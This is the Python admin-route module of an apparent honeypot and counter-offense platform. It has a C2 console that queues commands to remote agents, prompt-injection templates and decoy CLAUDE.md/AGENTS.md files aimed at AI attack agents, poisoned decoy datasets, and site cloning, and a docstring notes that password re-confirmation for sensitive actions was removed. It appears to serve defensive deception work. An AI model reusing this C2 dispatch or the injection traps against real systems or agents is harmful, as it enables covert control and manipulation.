import csv
import hashlib
import json
import mimetypes
import posixpath
import re
import secrets
import ssl
from collections.abc import Callable  # noqa: F401  (string annotations below)
from io import StringIO
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import Request as UrlRequest, urlopen

from fastapi import APIRouter, Depends, File, Form, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, Response
from fastapi.templating import Jinja2Templates
from sqlalchemy import delete, desc, func, select, update as sa_update
from sqlalchemy.orm import Session

from app.core.config import get_settings
from app.core.db import SessionLocal, get_db
from app.models.api_token import ApiToken
from app.models.c2_listener import C2Listener
from app.models.c2_task import C2Task
from app.models.decoy import DecoyDeployment, DecoyTemplate
from app.models.event import Event
from app.models.intel import ThreatIntelEntry
from app.models.internet_system import InternetSystem
from app.models.jsonp_template import JsonpTemplate
from app.models.login_log import LoginLog
from app.models.node import Node
from app.models.notification import AlertChannel, AlertPolicy
from app.models.prompt_injection import PromptInjectionTemplate
from app.models.service import ServiceCatalog, ServiceTemplate
from app.models.user import User
from app.services.api_tokens import create_api_token, list_api_tokens
from app.services.auth import (
    authenticate_user,
    create_login_log,
    filter_login_logs,
    hash_password,
    require_admin,
    require_user,
    verify_password,
)
from app.services.dashboard import (
    attack_chain,
    attack_trends,
    attack_trends_previous,
    dashboard_stats,
)
from app.services.events import (
    aggregated_attack_sources,
    aggregated_attacks,
    credential_asset_context,
    format_dt,
    node_attack_context,
    session_detail,
    source_profile,
    translate_signal,
)
from app.services.execution import filter_execution_history, list_execution_history, log_execution
from app.services.intel import intel_stats, list_intel_entries
from app.services.intel import invalidate_whitelist_cache as _invalidate_whitelist_cache
from app.services.jsonp_templates import (
    normalize_endpoint_path,
    normalize_method_key,
    params_from_csv,
)
from app.services.c2_service import (
    agent_stats,
    agent_task_count,
    auto_mark_offline,
    bulk_delete_agents,
    bulk_enqueue_task,
    delete_agent,
    enqueue_task,
    get_agent,
    get_nl_task_templates,
    get_task_templates,
    list_agents,
    list_tasks,
    serialize_task_full,
    task_type_stats,
)
from app.services.node_runtime import node_detail_bundle, node_listing_with_runtime, queue_node_task
from app.services.prompt_injection_templates import variables_from_csv
from app.services.deployed_server import register_deployed, unregister_deployed

router = APIRouter(tags=["admin"])
templates = Jinja2Templates(directory=str(Path(__file__).resolve().parents[1] / "templates"))


def _signal_zh_filter(value):
    """Translate signal key(s) to Chinese label(s)."""
    if value is None:
        return []
    if isinstance(value, str):
        return translate_signal(value)
    if isinstance(value, (list, tuple, set)):
        return [translate_signal(str(item)) for item in value]
    return translate_signal(str(value))


templates.env.filters.setdefault("signal_zh", _signal_zh_filter)


_STATUS_ZH = {
    # 节点 / Agent 状态
    "online": "在线",
    "paused": "暂停",
    "offline": "离线",
    "active": "活跃",
    "inactive": "不活跃",
    # 服务运行状态
    "running": "运行中",
    "stopped": "已停止",
    # 任务状态
    "queued": "排队中",
    "dispatched": "已分发",
    "completed": "已完成",
    "failed": "失败",
    "acked": "已确认",
    "pending": "待处理",
    # 登录 / 执行结果
    "success": "成功",
    "enabled": "已启用",
    "disabled": "已停用",
    "triggered": "已触发",
    "fetched": "已获取",
    "deployed": "已部署",
}


def _status_zh_filter(value):
    """Translate status enums to Chinese labels (unknown values pass through)."""
    if value is None:
        return "-"
    return _STATUS_ZH.get(str(value).lower(), str(value))


_DECISION_ZH = {
    "allow": "放行",
    "observe": "观察",
    "challenge": "质询",
    "isolate": "隔离",
    "block": "阻断",
    "放行": "放行",
    "观察": "观察",
    "质询": "质询",
    "隔离": "隔离",
    "阻断": "阻断",
}


def _decision_zh_filter(value):
    """Translate risk decisions to Chinese labels."""
    if value is None:
        return "-"
    return _DECISION_ZH.get(str(value).lower(), str(value))


templates.env.filters.setdefault("status_zh", _status_zh_filter)
templates.env.filters.setdefault("decision_zh", _decision_zh_filter)
PROJECT_ROOT = Path(__file__).resolve().parents[2]
WEB_TEMPLATE_UPLOAD_ROOT = PROJECT_ROOT / "data" / "web_app_templates"
DECOY_FILE_UPLOAD_ROOT = PROJECT_ROOT / "data" / "decoy_files"
WEB_TEMPLATE_KIND = "web-app-honeypot"
CLONED_TEMPLATE_ROOT = WEB_TEMPLATE_UPLOAD_ROOT / "cloned"

# ---- Clone async task tracking ----
# { task_id: { "stage": str, "percent": int, "done": bool, "error": str|None, "result": dict|None } }
import threading

_clone_tasks: dict[str, dict] = {}
_clone_tasks_lock = threading.Lock()


def _clone_update(
    task_id: str,
    *,
    stage: str,
    percent: int,
    done: bool = False,
    error: str | None = None,
    result: dict | None = None,
) -> None:
    with _clone_tasks_lock:
        entry = _clone_tasks.get(task_id)
        if entry:
            entry["stage"] = stage
            entry["percent"] = min(percent, 100)
            entry["done"] = done
            entry["error"] = error
            entry["result"] = result


def _clone_task_for_url(url: str) -> str:
    """Return an existing in-flight task_id for *url*, or '' if none."""
    with _clone_tasks_lock:
        for tid, entry in _clone_tasks.items():
            if entry.get("url") == url and not entry.get("done"):
                return tid
    return ""


CLONE_MAX_HTML_BYTES = 5 * 1024 * 1024
CLONE_MAX_ASSETS = 500
CLONE_MAX_ASSET_BYTES = 15 * 1024 * 1024
CLONE_URL_TIMEOUT = 12
CLONE_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CLONE_MOBILE_USER_AGENT = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
CLONE_ACCEPT_LANGUAGE = "zh-CN,zh;q=0.95,en;q=0.35"
CLONE_ASSET_REF_RE = re.compile(
    r'(?P<prefix><(?:script|img|link|source|video|audio|iframe|embed|object)\b[^>]*?\s(?:src|href|poster|data)=)(?P<quote>["\\\'])(?P<url>[^"\\\']+)(?P=quote)',
    re.IGNORECASE,
)
CLONE_CSS_URL_RE = re.compile(
    r'url\(\s*(?P<quote>["\']?)(?P<url>[^)\s"\']+)(?P=quote)\s*\)',
    re.IGNORECASE,
)
CLONE_SRCSET_RE = re.compile(
    r'srcset\s*=\s*(?P<quote>["\'])(?P<url>[^"\']+)(?P=quote)',
    re.IGNORECASE,
)
CLONE_PARAM_VALUE_RE = re.compile(
    r'<param\b[^>]*?\s(?:value|name)\s*=\s*["\'](?P<url>[^"\']*\.(?:swf|jpg|jpeg|png|gif|webp|svg|ico|mp3|mp4|wav|ogg|pdf))(?:\?[^"\']*)?["\']',
    re.IGNORECASE,
)


def _invalidate_alert_dispatcher_cache() -> None:
    from app.services.alert_dispatcher import get_alert_dispatcher

    get_alert_dispatcher().invalidate_cache()


AUDIT_ACTION_META = {
    "delete": {
        "action_label": "删除对象",
        "category": "资源删除",
        "category_tone": "warning",
        "risk_level": "高",
        "risk_tone": "warning",
    },
    "bulk_delete": {
        "action_label": "批量删除",
        "category": "资源删除",
        "category_tone": "warning",
        "risk_level": "严重",
        "risk_tone": "danger",
    },
    "cleanup": {
        "action_label": "清理记录",
        "category": "审计清理",
        "category_tone": "info",
        "risk_level": "中",
        "risk_tone": "info",
    },
    "reset-password": {
        "action_label": "重置密码",
        "category": "凭据变更",
        "category_tone": "warning",
        "risk_level": "高",
        "risk_tone": "warning",
    },
    "send_cmd": {
        "action_label": "命令投递",
        "category": "指令投递",
        "category_tone": "danger",
        "risk_level": "严重",
        "risk_tone": "danger",
    },
    "send_command": {
        "action_label": "命令投递",
        "category": "指令投递",
        "category_tone": "danger",
        "risk_level": "严重",
        "risk_tone": "danger",
    },
    "send_template": {
        "action_label": "模板投递",
        "category": "指令投递",
        "category_tone": "danger",
        "risk_level": "高",
        "risk_tone": "warning",
    },
    "bulk_cmd": {
        "action_label": "批量命令",
        "category": "批量任务",
        "category_tone": "danger",
        "risk_level": "严重",
        "risk_tone": "danger",
    },
    "queue-task": {
        "action_label": "任务下发",
        "category": "节点调度",
        "category_tone": "info",
        "risk_level": "中",
        "risk_tone": "info",
    },
}
AUDIT_STATUS_META = {
    "success": {"label": "成功", "tone": "success"},
    "queued": {"label": "排队中", "tone": "info"},
    "running": {"label": "执行中", "tone": "info"},
    "failed": {"label": "失败", "tone": "danger"},
    "error": {"label": "错误", "tone": "danger"},
}

NAV_GROUPS = [
    {
        "title": "监测分析",
        "items": [
            ("控制台", "/admin"),
            ("态势大屏", "/admin/big-screen"),
            ("攻击流量", "/admin/attacks"),
            ("攻击来源", "/admin/attack-sources"),
            ("攻击者画像", "/admin/attacker-profiles"),
        ],
    },
    {
        "title": "反制溯源",
        "items": [
            ("蜜罐会话回放", "/admin/honeypot-sessions"),
            ("文件蜜饵下载记录", "/admin/payload-tracking"),
            ("凭证蜜饵登陆记录", "/admin/credentials"),
            ("提示词注入触发记录", "/admin/agent-interactions"),
            ("Jsonp反制成功记录", "/admin/recon-data"),
        ],
    },
    {
        "title": "部署运营",
        "items": [
            ("节点管理", "/admin/nodes"),
            ("蜜饵管理", "/admin/decoy-management"),
            ("反制剧本", "/admin/playbooks"),
            ("元数据蜜罐", "/admin/counter-offense/metadata"),
            ("指令文件蜜饵", "/admin/counter-offense/agent_files"),
            ("MCP Server 蜜罐管理", "/admin/counter-offense/mcp"),
            ("消耗战数据集", "/admin/counter-offense/dataset"),
            ("行为序列指纹", "/admin/counter-offense/behavior"),
            ("Web 蜜罐门面", "/admin/counter-offense/thinkphp"),
            ("互联网系统接入", "/admin/internet-systems"),
            ("提示词注入管理", "/admin/prompt-injection"),
            ("功能性伪装反制", "/admin/portal"),
            ("端口服务蜜罐管理", "/admin/services"),
            ("Web应用蜜罐管理", "/admin/templates"),
            ("Jsonp模版管理", "/admin/jsonp-templates"),
            ("内网横向 Wiki", "/admin/counter-offense/intranet"),
        ],
    },
    {
        "title": "C2 控制",
        "items": [
            ("Agent 管理", "/admin/c2/agents"),
            ("C2 Console", "/admin/c2/console"),
        ],
    },
    {
        "title": "平台设置",
        "items": [
            ("执行历史", "/admin/execution-history"),
            ("登陆日志", "/admin/login-logs"),
            ("用户管理", "/admin/users"),
            ("API 令牌", "/admin/api-tokens"),
            ("系统设置", "/admin/profile"),
        ],
    },
    {
        "title": "告警与情报",
        "items": [
            ("告警配置", "/admin/alerts"),
            ("威胁情报", "/admin/intel"),
        ],
    },
]

NAV_ICONS = {
    "/admin": "dashboard",
    "/admin/big-screen": "monitor",
    "/admin/attacks": "activity",
    "/admin/credentials": "key",
    "/admin/recon-data": "monitor",
    "/admin/payload-tracking": "crosshair",
    "/admin/agent-interactions": "bot",
    "/admin/nodes": "server",
    "/admin/services": "wrench",
    "/admin/templates": "template",
    "/admin/internet-systems": "globe",
    "/admin/decoy-management": "flag",
    "/admin/prompt-injection": "bot",
    "/admin/jsonp-templates": "monitor",
    "/admin/counter-offense": "target",
    "/admin/counter-offense/agent_files": "file-text",
    "/admin/counter-offense/mcp": "terminal",
    "/admin/counter-offense/dataset": "database",
    "/admin/counter-offense/metadata": "cloud",
    "/admin/counter-offense/intranet": "globe",
    "/admin/counter-offense/behavior": "activity",
    "/admin/counter-offense/thinkphp": "server",
    "/admin/playbooks": "zap",
    "/admin/attacker-profiles": "users",
    "/admin/portal": "target",
    "/admin/c2/console": "terminal",
    "/admin/c2/agents": "bot",
    "/admin/honeypot-sessions": "history",
    "/admin/execution-history": "history",
    "/admin/login-logs": "file-text",
    "/admin/users": "users",
    "/admin/profile": "settings",
    "/admin/api-tokens": "开放 API Key 签发与管理",
}

NAV_DESCRIPTIONS = {
    "/admin": "全局指标与联动入口",
    "/admin/big-screen": "值守展示与趋势大屏",
    "/admin/attacks": "攻击流量聚合与回溯",
    "/admin/attack-sources": "来源 IP 画像与行为聚类",
    "/admin/credentials": "凭证蜜饵登陆记录",
    "/admin/recon-data": "Jsonp 反制成功记录",
    "/admin/payload-tracking": "文件蜜饵下载与回调记录",
    "/admin/agent-interactions": "提示词注入触发记录",
    "/admin/nodes": "探针节点与运行状态",
    "/admin/services": "端口协议与服务型蜜罐",
    "/admin/templates": "Web 应用蜜罐模板",
    "/admin/internet-systems": "互联网业务无损接入",
    "/admin/decoy-management": "蜜饵模板、分发路径与部署",
    "/admin/prompt-injection": "提示词注入模板与内容维护",
    "/admin/jsonp-templates": "Jsonp 请求方法与回调模板",
    "/admin/counter-offense": "六个反制诱饵面总览与横向移动告警",
    "/admin/counter-offense/agent_files": "AGENTS.md / CLAUDE.md / .cursorrules 指令文件蜜饵配置",
    "/admin/counter-offense/mcp": "MCP 工具服务蜜罐配置",
    "/admin/counter-offense/dataset": "消耗战毒化数据集配置",
    "/admin/counter-offense/metadata": "云元数据 SSRF 蜜罐配置",
    "/admin/counter-offense/intranet": "内网横向 Wiki 蜜罐配置",
    "/admin/counter-offense/behavior": "行为序列指纹参数配置",
    "/admin/counter-offense/thinkphp": "Web 蜜罐门面（ThinkPHP 仿真）开关与指纹配置",
    "/admin/playbooks": "一键应用成套反制姿态",
    "/admin/attacker-profiles": "按来源聚合的攻击者持久画像",
    "/admin/portal": "功能性伪装反制通道（Portal API）运营配置",
    "/admin/alerts": "通知渠道与告警策略",
    "/admin/intel": "白名单与威胁情报",
    "/admin/c2/console": "实时命令与 Beacon",
    "/admin/c2/agents": "Agent 清单与状态",
    "/admin/honeypot-sessions": "交互式蜜罐会话与逐命令回放",
    "/admin/execution-history": "后台操作流水",
    "/admin/login-logs": "登录成功与失败记录",
    "/admin/users": "账号、角色与密码",
    "/admin/profile": "个人资料、密码与控制台安全路径",
}


def _render(request: Request, template_name: str, context: dict) -> HTMLResponse:
    nav_base = context.pop("nav_base", None)
    active_path = nav_base or request.url.path
    # Find the best-matching nav item (longest prefix match)
    best_match = ""
    for group in NAV_GROUPS:
        for _, href in group["items"]:
            if active_path == href or active_path.startswith(f"{href}/"):
                if len(href) > len(best_match):
                    best_match = href

    nav_groups = []
    for group in NAV_GROUPS:
        rendered_items = []
        for label, href in group["items"]:
            is_active = href == best_match
            rendered_items.append(
                {
                    "label": label,
                    "href": href,
                    "active": is_active,
                    "icon": NAV_ICONS.get(href, "dashboard"),
                    "description": NAV_DESCRIPTIONS.get(href, ""),
                }
            )
        nav_groups.append({"title": group["title"], "links": rendered_items})
    if "current_user" not in context and "user" in context:
        context["current_user"] = context["user"]
    from app.services.system_settings import (
        DEFAULT_ADMIN_ACCESS_PATH,
        get_admin_access_path,
    )

    admin_access_path = get_admin_access_path()
    path_banner_dismissed = bool(request.session.get("admin_path_banner_dismissed"))
    full_context = {
        "request": request,
        "nav_groups": nav_groups,
        "active_path": active_path,
        "site_id": get_settings().site_id,
        "admin_access_path": admin_access_path,
        "admin_path_is_default": admin_access_path == DEFAULT_ADMIN_ACCESS_PATH,
        "admin_path_banner_dismissed": path_banner_dismissed,
        **context,
    }
    return templates.TemplateResponse(request, template_name, full_context)


def _redirect(path: str) -> RedirectResponse:
    return RedirectResponse(path, status_code=303)


def _parse_json(text: str, default):
    text = (text or "").strip()
    if not text:
        return default
    return json.loads(text)


def _csv_response(filename: str, rows: list[dict], fieldnames: list[str] | None = None) -> Response:
    buffer = StringIO()
    columns = fieldnames or (list(rows[0].keys()) if rows else [])
    if columns:
        writer = csv.DictWriter(buffer, fieldnames=columns)
        writer.writeheader()
        for row in rows:
            writer.writerow(row)
    # UTF-8 BOM so Excel renders Chinese columns correctly on double-click.
    return Response(
        content="\ufeff" + buffer.getvalue(),
        media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


def _qs(**params: str | None) -> str:
    clean_params = {key: value for key, value in params.items() if value not in (None, "")}
    return ("?" + urlencode(clean_params)) if clean_params else ""


def _parse_admin_datetime(value: str | None, *, end_of_day: bool = False) -> datetime | None:
    raw = (value or "").strip()
    if not raw:
        return None
    try:
        dt = datetime.fromisoformat(raw.replace("Z", "+00:00"))
        if len(raw) == 10 and end_of_day:
            dt = dt + timedelta(days=1)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        else:
            dt = dt.astimezone(timezone.utc)
        return dt
    except ValueError:
        return None




def _queue_sensitive_action(
    request: Request,
    *,
    action: str,
    params: dict,
    return_to: str,
    title: str = "",
    description: str = "",
) -> RedirectResponse:
    """Execute the guarded action immediately.

    The password re-confirmation flow was retired (login is the trust
    boundary now); every caller site stays untouched and the execution +
    audit-log behaviour of :func:`_execute_sensitive_action` is unchanged.
    """
    with SessionLocal() as db:
        user = _require_admin(request, db)
        pending = {"action": action, "params": params, "return_to": return_to}
        target = _execute_sensitive_action(db, user, pending)
    return _redirect(target or return_to)


def _bulk_delete_entities(
    db: Session,
    actor: User,
    model,
    ids: list[int],
    *,
    module: str,
    target_type: str,
    ref_attr: str,
    skip=None,
    pre_delete=None,
) -> int:
    """Shared batch-delete loop for deployment-operations config entities.

    Mirrors the per-entity single-delete semantics (same audit trail,
    same builtin guards) and returns how many rows were removed.
    ``pre_delete(db, item)`` runs before each delete for dependent-row
    cleanup (e.g. decoy deployments holding an FK to the template).
    """
    deleted = 0
    for entity_id in ids:
        try:
            entity_id = int(entity_id)
        except (TypeError, ValueError):
            continue
        item = db.get(model, entity_id)
        if not item:
            continue
        if skip is not None and skip(item):
            continue
        ref = str(getattr(item, ref_attr, "") or item.id)
        if pre_delete is not None:
            pre_delete(db, item)
        db.delete(item)
        db.commit()
        deleted += 1
        log_execution(
            db,
            actor_username=actor.username,
            action="bulk_delete",
            module=module,
            target_type=target_type,
            target_ref=ref,
        )
    return deleted


def _execute_sensitive_action(db: Session, actor: User, pending: dict) -> str:
    action = pending["action"]
    params = pending.get("params", {})
    return_to = pending.get("return_to", "/admin")

    if action == "delete_node":
        node = db.get(Node, params["node_id"])
        if node and not node.is_builtin:
            db.delete(node)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="nodes",
                target_type="node",
                target_ref=node.name,
            )
    elif action == "delete_service":
        item = db.get(ServiceCatalog, params["service_id"])
        if item:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="services",
                target_type="service",
                target_ref=item.service_key,
            )
    elif action == "delete_template":
        item = db.get(ServiceTemplate, params["template_id"])
        if item:
            # events.template_id references this template (no DB-level cascade
            # by design); null the references and stop any live deployment
            # before the delete, or a FOREIGN KEY constraint aborts it.
            db.execute(
                sa_update(Event)
                .where(Event.template_id == item.id)
                .values(template_id=None)
            )
            for node_row in db.scalars(select(Node)).all():
                entries = [
                    e for e in (node_row.deployed_services_json or [])
                    if not (
                        isinstance(e, dict) and e.get("template_id") == item.id
                    )
                ]
                if len(entries) != len(node_row.deployed_services_json or []):
                    for entry in node_row.deployed_services_json or []:
                        if (
                            isinstance(entry, dict)
                            and entry.get("template_id") == item.id
                            and entry.get("deploy_port")
                        ):
                            try:
                                from app.services.deployed_server import (
                                    unregister_deployed,
                                )

                                unregister_deployed(
                                    int(entry["deploy_port"]),
                                    str(entry.get("deploy_route", "/") or "/"),
                                )
                            except Exception:
                                pass
                    node_row.deployed_services_json = entries
                    db.add(node_row)
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="templates",
                target_type="template",
                target_ref=item.name,
            )
    elif action == "delete_decoy_template":
        item = db.get(DecoyTemplate, params["template_id"])
        if item:
            # deployments hold an FK to the template; drop them first or the
            # delete fails with FOREIGN KEY constraint on SQLite/PG
            for dep in db.scalars(
                select(DecoyDeployment).where(DecoyDeployment.template_id == item.id)
            ).all():
                db.delete(dep)
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="decoys",
                target_type="decoy-template",
                target_ref=item.name,
            )
    elif action == "delete_prompt_injection_template":
        item = db.get(PromptInjectionTemplate, params["template_id"])
        if item:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="prompt-injection",
                target_type="prompt-template",
                target_ref=item.name,
            )
    elif action == "delete_jsonp_template":
        item = db.get(JsonpTemplate, params["template_id"])
        if item:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="jsonp-templates",
                target_type="jsonp-template",
                target_ref=item.name,
            )
    elif action == "delete_internet_system":
        item = db.get(InternetSystem, params["system_id"])
        if item:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="internet-systems",
                target_type="internet-system",
                target_ref=item.domain,
            )
    elif action == "delete_alert_channel":
        item = db.get(AlertChannel, params["channel_id"])
        if item:
            db.delete(item)
            db.commit()
            _invalidate_alert_dispatcher_cache()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="alerts",
                target_type="channel",
                target_ref=item.name,
            )
    elif action == "delete_c2_listener":
        item = db.get(C2Listener, params["listener_id"])
        if item:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="c2-listeners",
                target_type="listener",
                target_ref=item.name,
            )
    elif action == "delete_alert_policy":
        item = db.get(AlertPolicy, params["policy_id"])
        if item:
            db.delete(item)
            db.commit()
            _invalidate_alert_dispatcher_cache()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="alerts",
                target_type="policy",
                target_ref=item.name,
            )
    elif action == "delete_intel_entry":
        item = db.get(ThreatIntelEntry, params["entry_id"])
        if item:
            db.delete(item)
            db.commit()
            _invalidate_whitelist_cache()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="intel",
                target_type="entry",
                target_ref=item.value,
            )
    elif action == "cleanup_login_logs":
        deleted = db.execute(delete(LoginLog))
        db.commit()
        log_execution(
            db,
            actor_username=actor.username,
            action="cleanup",
            module="login-logs",
            target_type="login-log",
            target_ref=str(deleted.rowcount or 0),
        )
    elif action == "delete_user":
        item = db.get(User, params["user_id"])
        if item and item.username != actor.username:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="users",
                target_type="user",
                target_ref=item.username,
            )
    elif action == "reset_user_password":
        item = db.get(User, params["user_id"])
        if item:
            item.password_hash = hash_password(params["new_password"])
            db.add(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="reset-password",
                module="users",
                target_type="user",
                target_ref=item.username,
            )
    elif action == "delete_api_token":
        item = db.get(ApiToken, params["token_id"])
        if item:
            db.delete(item)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="api-tokens",
                target_type="token",
                target_ref=item.name,
            )
    elif action == "delete_c2_listener":
        listener = db.get(C2Listener, params["listener_id"])
        if listener:
            db.delete(listener)
            db.commit()
            log_execution(
                db,
                actor_username=actor.username,
                action="delete",
                module="c2",
                target_type="listener",
                target_ref=listener.name,
            )
    elif action == "delete_c2_agent":
        delete_agent(db, params["agent_id"])
        log_execution(
            db,
            actor_username=actor.username,
            action="delete",
            module="c2",
            target_type="agent",
            target_ref=params["agent_id"],
        )
    elif action == "bulk_delete_c2_agents":
        deleted = bulk_delete_agents(db, params["agent_ids"])
        log_execution(
            db,
            actor_username=actor.username,
            action="bulk_delete",
            module="c2",
            target_type="agent",
            target_ref=f"{deleted} agents",
        )
    elif action == "c2_send_command":
        enqueue_task(
            db,
            agent_id=params["agent_id"],
            task_type=params["task_type"],
            command=params["command"],
            arguments_json=params.get("arguments_json", {}),
            created_by=actor.username,
        )
        log_execution(
            db,
            actor_username=actor.username,
            action="send_command",
            module="c2",
            target_type="agent",
            target_ref=params["agent_id"],
        )
    elif action == "c2_send_template":
        enqueue_task(
            db,
            agent_id=params["agent_id"],
            task_type=params["task_type"],
            command=params["command"],
            arguments_json=params.get("arguments_json", {}),
            created_by=actor.username,
        )
        log_execution(
            db,
            actor_username=actor.username,
            action="send_template",
            module="c2",
            target_type="agent",
            target_ref=params["agent_id"],
        )
    elif action == "c2_bulk_cmd":
        bulk_enqueue_task(
            db,
            agent_ids=params["agent_ids"],
            task_type=params["task_type"],
            command=params["command"],
            arguments_json=params.get("arguments_json", {}),
            created_by=actor.username,
        )
        log_execution(
            db,
            actor_username=actor.username,
            action="bulk_cmd",
            module="c2",
            target_type="agent",
            target_ref=f"{len(params['agent_ids'])} agents",
        )
    elif action == "queue_node_task":
        node = db.get(Node, params["node_id"])
        if node:
            queue_node_task(
                db,
                node=node,
                task_type=params["task_type"],
                created_by=actor.username,
                priority=params.get("priority", 50),
                notes=params.get("notes"),
                task_payload_json=params.get("task_payload_json", {}),
            )
            log_execution(
                db,
                actor_username=actor.username,
                action="queue-task",
                module="nodes",
                target_type="node-task",
                target_ref=node.name,
            )
    return return_to


def _require_user(request: Request, db: Session) -> User:
    return require_user(request, db)


def _require_admin(request: Request, db: Session) -> User:
    return require_admin(request, db)




def _safe_web_template_filename(filename: str | None) -> str:
    raw_name = Path(filename or "").name.strip() or f"web-template-{secrets.token_hex(4)}.html"
    safe = "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in raw_name)
    return safe[:140] or f"web-template-{secrets.token_hex(4)}.html"


def _normalize_web_entry_path(value: str) -> str:
    path = (value or "/").strip() or "/"
    if not path.startswith("/"):
        path = f"/{path}"
    return path


async def _save_web_template_upload(upload: UploadFile | None) -> tuple[str, str]:
    if not upload or not upload.filename:
        return "", ""
    WEB_TEMPLATE_UPLOAD_ROOT.mkdir(parents=True, exist_ok=True)
    original_name = _safe_web_template_filename(upload.filename)
    unique_name = f"{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}-{secrets.token_hex(4)}-{original_name}"
    target = WEB_TEMPLATE_UPLOAD_ROOT / unique_name
    with target.open("wb") as handle:
        while chunk := await upload.read(1024 * 1024):
            handle.write(chunk)
    try:
        stored_path = str(target.relative_to(PROJECT_ROOT))
    except ValueError:
        stored_path = str(target)
    return original_name, stored_path


def _safe_decoy_file_name(filename: str | None) -> str:
    raw_name = Path(filename or "").name.strip() or f"decoy-file-{secrets.token_hex(4)}.txt"
    safe = "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in raw_name)
    return safe[:160] or f"decoy-file-{secrets.token_hex(4)}.txt"


def _looks_text_bytes(raw: bytes) -> bool:
    if not raw:
        return True
    if b"\x00" in raw[:4096]:
        return False
    sample = raw[:8192]
    decoded = sample.decode("utf-8", errors="replace")
    return decoded.count("�") / max(len(decoded), 1) < 0.03


async def _save_decoy_file_upload(upload: UploadFile | None) -> tuple[dict, bytes]:
    if not upload or not upload.filename:
        return {}, b""
    DECOY_FILE_UPLOAD_ROOT.mkdir(parents=True, exist_ok=True)
    original_name = _safe_decoy_file_name(upload.filename)
    unique_name = f"{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}-{secrets.token_hex(4)}-{original_name}"
    target = DECOY_FILE_UPLOAD_ROOT / unique_name
    raw = await upload.read()
    target.write_bytes(raw)
    try:
        stored_path = str(target.relative_to(PROJECT_ROOT))
    except ValueError:
        stored_path = str(target)
    return {
        "uploaded_file_name": original_name,
        "artifact_path": stored_path,
        "content_type": upload.content_type
        or mimetypes.guess_type(original_name)[0]
        or "application/octet-stream",
        "uploaded_size": len(raw),
        "is_text": _looks_text_bytes(raw),
    }, raw


def _web_template_metadata(item: ServiceTemplate) -> dict | None:
    raw = item.services_json or []
    if isinstance(raw, dict):
        metadata = raw
    elif isinstance(raw, list) and raw and isinstance(raw[0], dict):
        metadata = raw[0]
    else:
        metadata = {}
    if metadata.get("type") != WEB_TEMPLATE_KIND:
        return None
    return metadata


def _web_template_rows(items: list[ServiceTemplate]) -> list[dict]:
    rows: list[dict] = []
    for item in items:
        metadata = _web_template_metadata(item)
        if not metadata:
            continue
        rows.append(
            {
                "id": item.id,
                "name": item.name,
                "description": item.description,
                "created_at": item.created_at.strftime("%Y-%m-%d %H:%M")
                if item.created_at
                else "-",
                "web_stack": metadata.get("web_stack") or "Web 页面",
                "entry_path": metadata.get("entry_path") or "/",
                "deploy_mode": metadata.get("deploy_mode") or "静态页面仿真",
                "artifact_name": metadata.get("artifact_name") or "",
                "artifact_path": metadata.get("artifact_path") or "",
                "clone_source_url": metadata.get("clone_source_url") or "",
                "created_by_clone": bool(metadata.get("created_by_clone")),
                "clone_asset_count": metadata.get("clone_asset_count"),
                "clone_total_kb": metadata.get("clone_total_kb"),
                "clone_accept_language": metadata.get("clone_accept_language") or "",
                "clone_locale": metadata.get("clone_locale") or "",
                "clone_user_agent": metadata.get("clone_user_agent") or "",
            }
        )
    return rows


def _normalize_system_domain(value: str) -> str:
    raw = (value or "").strip()
    if "://" in raw:
        raw = urlsplit(raw).netloc
    raw = raw.split("/")[0].strip().lower().rstrip(".")
    return raw[:255]


def _normalize_upstream_url(value: str) -> str:
    raw = (value or "").strip().rstrip("/")
    if not raw:
        return ""
    if not raw.lower().startswith(("http://", "https://")):
        raw = f"http://{raw}"
    return raw[:512]


def _internet_system_status_tone(status: str, enabled: bool) -> str:
    if not enabled or status == "暂停":
        return "warning"
    if status in {"反制模式", "灰度注入"}:
        return "success"
    if status == "监测模式":
        return "info"
    return "info"


def _internet_system_config_preview(item: InternetSystem) -> str:
    return (
        f"# AgentCapture 无损接入：{item.name}\n"
        f"server {{\n"
        f"  listen 443 ssl http2;\n"
        f"  server_name {item.domain};\n"
        f"\n"
        f"  # fail-safe: {item.failover_mode}；默认放行到原业务\n"
        f"  location / {{\n"
        f"    proxy_set_header Host $host;\n"
        f"    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n"
        f"    proxy_set_header X-AgentCapture-Site {item.domain};\n"
        f"    proxy_pass {item.upstream_url};\n"
        f"  }}\n"
        f"\n"
        f"  # observe={item.status}; inject={item.inject_policy}; decoy={item.decoy_policy}; risk={item.risk_policy}\n"
        f"}}"
    )


